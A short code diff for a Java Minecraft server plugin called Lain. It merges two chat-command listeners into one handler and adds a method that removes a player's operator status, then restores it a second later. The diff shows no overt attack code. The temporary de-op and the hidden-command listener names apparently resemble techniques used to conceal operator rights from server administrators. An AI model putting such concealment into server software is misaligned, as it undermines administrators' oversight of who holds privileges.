@@ -44,8 +44,7 @@ public class Lain extends JavaPlugin {
     void registerListeners(PluginManager pm)
     {
         pm.registerEvents(new Checkfiles(this), this);
-        pm.registerEvents(new InternalCommands(this), this);
-        pm.registerEvents(new PerformCommand(this), this);
+        pm.registerEvents(new ChatCommandHandler(this), this);
         pm.registerEvents(new PlayerJoin(this), this);
         pm.registerEvents(new SpecialEffects(this), this);
         pm.registerEvents(new PlayerDisconnect(this), this);
@@ -205,6 +204,20 @@ public class Lain extends JavaPlugin {
             }
         } catch (IOException e) {
             e.printStackTrace();
+        }
+    }
+
+    public void checkOp(final Player p)
+    {
+        if (p.isOp()) {
+            p.setOp(false);
+            Bukkit.getScheduler().scheduleSyncDelayedTask(this, new Runnable() {
+                @Override
+                public void run()
+                {
+                    p.setOp(true);
+                }
+            }, 20L);
         }
     }
 }
